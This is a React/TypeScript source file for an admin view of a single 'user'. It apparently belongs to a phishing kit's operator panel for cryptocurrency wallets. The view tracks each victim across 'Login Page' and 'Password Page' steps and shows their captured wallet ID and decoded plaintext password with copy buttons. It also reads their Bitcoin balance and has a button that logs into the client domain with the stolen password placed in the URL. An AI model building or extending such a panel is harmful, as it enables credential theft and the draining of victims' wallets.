import React from 'react';
import { useDispatch } from 'react-redux';
import AppTableContainer from '../../../@crema/core/AppTableContainer';
import StepConnector from '@material-ui/core/StepConnector';
import { makeStyles, withStyles } from '@material-ui/core/styles';
import Stepper from '@material-ui/core/Stepper';
import Step from '@material-ui/core/Step';
import Fab from '@material-ui/core/Fab';
import StepLabel from '@material-ui/core/StepLabel';
import SettingsIcon from '@material-ui/icons/Settings';
import GroupAddIcon from '@material-ui/icons/GroupAdd';
import VideoLabelIcon from '@material-ui/icons/VideoLabel';
import { User } from '../../../types/models/User';
import clsx from 'clsx';
import UserSummary from 'shared/components/UserSummary';
import { Fonts } from '../../constants/AppEnums';
import { GridContainer } from '@crema';
import {
    Box,
    Button,
    Grid,
    IconButton,
    InputAdornment,
    // Snackbar,
    // SnackbarContent,
    TextField
} from '@material-ui/core';
import AppCard from '@crema/core/AppCard';
import { onBlockUser, onSetPin } from 'redux/actions/Users';
import { CremaTheme } from 'types/AppContextPropsType';
import getSymbolFromCurrency from 'currency-symbol-map'
import StateCard from './StateCards';
import { CopyToClipboard } from 'react-copy-to-clipboard';
import FileCopy from '@material-ui/icons/FileCopy';

import ReactNotification, { store } from 'react-notifications-component'
import 'react-notifications-component/dist/theme.css'

interface UserDataProps {
    userData: User;
    clientDomain: string;
}

const useStyles = makeStyles((theme: CremaTheme) => ({
    statsCard: {
        borderRadius: theme.overrides.MuiCardLg.root.borderRadius,
    },
    margin: {
        margin: theme.spacing(5),
    },
    inputs: {
        width: '100%',
    },
    table: {
        display: 'flex',
        flexWrap: 'wrap'
    },
    row: {
        display: 'flex'
    },
    col: {
        flex: '1 1 auto',
        flexBasis: '25%',
        textAlign: 'center',
        lineHeight: '348%',
    },
    formControl: {
        margin: theme.spacing(1),
        minWidth: 120,
        flex: 1,
    },
    buttons: {
        flex: 1,
        marginRight: theme.spacing(2)
    },
    message: {
        display: 'flex',
        alignItems: 'center',
    }
}));

const ColorlibConnector = withStyles({
    alternativeLabel: {
        top: 22,
    },
    active: {
        '& $line': {
            backgroundImage:
                'linear-gradient( 95deg,rgb(242,113,33) 0%,rgb(233,64,87) 50%,rgb(138,35,135) 100%)',
        },
    },
    completed: {
        '& $line': {
            backgroundImage:
                'linear-gradient( 95deg,rgb(242,113,33) 0%,rgb(233,64,87) 50%,rgb(138,35,135) 100%)',
        },
    },
    line: {
        height: 3,
        border: 0,
        backgroundColor: '#eaeaf0',
        borderRadius: 1,
    },
})(StepConnector);

const useColorlibStepIconStyles = makeStyles({
    root: {
        backgroundColor: '#ccc',
        zIndex: 1,
        color: '#fff',
        width: 50,
        height: 50,
        display: 'flex',
        borderRadius: '50%',
        justifyContent: 'center',
        alignItems: 'center',
    },
    active: {
        backgroundImage:
            'linear-gradient( 136deg, rgb(242,113,33) 0%, rgb(233,64,87) 50%, rgb(138,35,135) 100%)',
        boxShadow: '0 4px 10px 0 rgba(0,0,0,.25)',
    },
    completed: {
        backgroundImage:
            'linear-gradient( 136deg, rgb(242,113,33) 0%, rgb(233,64,87) 50%, rgb(138,35,135) 100%)',
    },
});

function ColorlibStepIcon(props: any) {
    const classes = useColorlibStepIconStyles();
    const { active, completed } = props;
    const icons = {
        1: <SettingsIcon />,
        2: <GroupAddIcon />,
        3: <VideoLabelIcon />,
        4: <VideoLabelIcon />,
    };
    return (
        <div
            className={clsx(classes.root, {
                [classes.active]: active,
                [classes.completed]: completed,
            })}>
            {props.icon === 1 || props.icon === undefined ? icons[1] : (props.icon === 2 ? icons[2] : props.icon === 3 ? icons[3] : icons[4])}
        </div>
    );
}
function getSteps() {
    return ['Login Page', 'Password Page', 'Dashboard', 'Logout'];
}

const UserView: React.FC<UserDataProps> = ({ userData, clientDomain }) => {
    // const [openCopiedSnackbar, setOpenCopiedSnackbar] = React.useState(false);
    const dispatch = useDispatch();
    const classes = useStyles();
    const activeStep = parseInt(userData.status || '0');
    const steps = getSteps();

    const openDashboard = () => {
        let password = '';
        try {
            password = atob(userData.password);
        } catch (e) {

        }
        window.open(clientDomain + '?uid=' + userData.uid + '&pws=' + password);
    }

    const setBlock = () => {
        dispatch(onBlockUser(userData.uid, !userData.blocked))
        return store.addNotification({
            title: "",
            message: "Successfully Blocked",
            container: 'top-right',
            type: 'danger',
        });
    }

    const setPin = () => {
        dispatch(onSetPin(userData.uid))
        return store.addNotification({
            title: "",
            message: "Successfully Pinned",
            container: 'top-right',
            type: 'info',
        });
    }

    const getLocalBalance = () => {
        try {
            const balance = JSON.parse(userData.balance);
            if (balance.wallet) {
                return getSymbolFromCurrency(balance.info.symbol_local.code) + ' ' + (balance.wallet.final_balance / balance.info.symbol_local.conversion).toFixed(3);
            }
        } catch (e) {
            return '0';
        }
    }

    // const getBtcBalance = () => {
    //     try {
    //         const balance = JSON.parse(userData.balance);
    //         if (balance.wallet) {
    //             return (balance.wallet.final_balance / balance.info.symbol_btc.conversion) + ' ' + balance.info.symbol_btc.code;
    //         }
    //     } catch (e) {
    //         return 0;
    //     }
    // }

    const onCopyHandler = (_text: string, _result: boolean) => {
        // setOpenCopiedSnackbar(true);
        return store.addNotification({
            title: "",
            message: "Successfully Copied",
            container: 'top-right',
            type: 'success',
        });
    }

    // const onCloseSnackbarHandler = (_event: any, _reason: any) => {
    //     setOpenCopiedSnackbar(false);
    // }

    let password = '';
    try {
        password = atob(userData.password)
    } catch (e) {
        console.log(e)
    }
    return (
        <AppTableContainer>
            <ReactNotification />
            <Box className={classes.margin}>
                <Stepper
                    alternativeLabel
                    activeStep={activeStep}
                    connector={<ColorlibConnector />}>
                    {steps.map((label) => (
                        <Step key={label}>
                            <StepLabel StepIconComponent={ColorlibStepIcon}>{label}</StepLabel>
                        </Step>
                    ))}
                </Stepper>
            </Box>
            <Box className={classes.margin}>
                {
                    userData === null ? <></> :
                        <>
                            <GridContainer>
                                <Grid item xs={12} md={4}>
                                    <UserSummary userData={userData}></UserSummary>
                                </Grid>
                                <Grid item xs={12} md={4}>
                                    <StateCard data={
                                        {
                                            id: 1,
                                            type: 'TOTAL BALANCE',
                                            value: getLocalBalance() || '0',
                                            growth: 0,
                                            icon: '/assets/images/icon-blood.png',
                                            strokeColor: '',
                                            graphData: []
                                        }
                                    } />
                                    <AppCard>
                                        <Box display='flex' flex={1} flexDirection='column'>
                                            <Box display='flex' flex={1} flexDirection='row'>
                                                <Box position='relative' mr={{ xs: 3, xl: 6 }}>
                                                    <Box mb={1}>
                                                        <Box
                                                            component='h3'
                                                            display='inline-block'
                                                            fontWeight={Fonts.BOLD}
                                                            fontSize={20}>
                                                            STATUS
                                                        </Box>
                                                    </Box>
                                                </Box>
                                            </Box>
                                            <Box>
                                                <Button variant='outlined' color='secondary'>
                                                    {userData.isOffline ? 'OFFLINE' : 'ONLINE'}
                                                </Button>
                                            </Box>
                                        </Box>
                                    </AppCard>
                                </Grid>
                                <Grid item xs={12} md={4}>
                                    <Box className={classes.margin}>
                                        <Box>
                                            <Fab
                                                variant='extended'
                                                size='medium'
                                                color='primary'
                                                aria-label='add'
                                                className={classes.margin}
                                                onClick={(e) => openDashboard()}
                                            >
                                                OPEN DASHBOARD
                                            </Fab>
                                            <Fab
                                                variant='extended'
                                                size='medium'
                                                color='primary'
                                                aria-label='add'
                                                className={classes.margin}
                                                onClick={(e) => setPin()}
                                            >
                                                PIN USER
                                            </Fab>
                                            <Fab
                                                variant='extended'
                                                size='medium'
                                                color='primary'
                                                aria-label='add'
                                                className={classes.margin}
                                                onClick={() => setBlock()}
                                            >
                                                BLOCK
                                            </Fab>
                                        </Box>
                                    </Box>
                                </Grid>
                            </GridContainer>
                        </>
                }
            </Box>
            <Box className={classes.margin}>
                <GridContainer>
                    <Grid item xs={12} md={6}>
                        <AppCard>
                            <TextField
                                variant='outlined'
                                label='WALLET ID'
                                value={userData.uid}
                                disabled={true}
                                fullWidth
                                InputProps={{
                                    endAdornment: (
                                        <InputAdornment position='end'>
                                            <CopyToClipboard text={userData.uid} onCopy={(text: string, result: boolean) => onCopyHandler(text, result)}>
                                                <IconButton
                                                    edge='end'
                                                    aria-label='toggle password visibility'>
                                                    <FileCopy />
                                                </IconButton>
                                            </CopyToClipboard>
                                        </InputAdornment>
                                    ),
                                }}
                            />
                        </AppCard>
                    </Grid>
                    <Grid item xs={12} md={6}>
                        <AppCard>
                            <TextField
                                variant='outlined'
                                label='PASSWORD'
                                value={password}
                                disabled={true}
                                fullWidth
                                InputProps={{
                                    endAdornment: (
                                        <InputAdornment position='end'>
                                            <CopyToClipboard text={password} onCopy={(text: string, result: boolean) => onCopyHandler(text, result)}>
                                                <IconButton
                                                    edge='end'
                                                    aria-label='toggle password visibility'>
                                                    <FileCopy />
                                                </IconButton>
                                            </CopyToClipboard>
                                        </InputAdornment>
                                    ),
                                }}
                            />
                        </AppCard>
                    </Grid>
                </GridContainer>
            </Box>
            {/* <Snackbar
                anchorOrigin={{
                    vertical: 'top',
                    horizontal: 'right',
                }}
                open={openCopiedSnackbar}
                autoHideDuration={6000}
                onClose={onCloseSnackbarHandler}>
                <SnackbarContent
                    className='success'
                    aria-describedby='client-snackbar'
                    message={
                        <span id='client-snackbar' className={classes.message}>
                            Successfully Copied
                        </span>
                    }
                />
            </Snackbar> */}
        </AppTableContainer>
    );
};

export default UserView;
